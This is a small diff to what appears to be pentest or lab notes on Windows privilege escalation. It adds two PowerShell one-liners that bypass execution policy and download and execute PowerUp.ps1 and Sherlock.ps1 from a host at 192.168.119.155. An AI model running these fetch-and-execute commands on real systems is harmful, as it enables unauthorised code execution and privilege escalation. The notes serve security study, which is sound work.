@@ -35,7 +35,11 @@ arp -A
 ````
 Run winpeas 
 Run PowerUp.ps1
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/PowerUp.ps1');Invoke-AllChecks"
+
 Run Sherlock.ps1
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.155/Sherlock.ps1');Find-AllVulns"
+
 accesschk.exe /accepteula -wvu
 
 
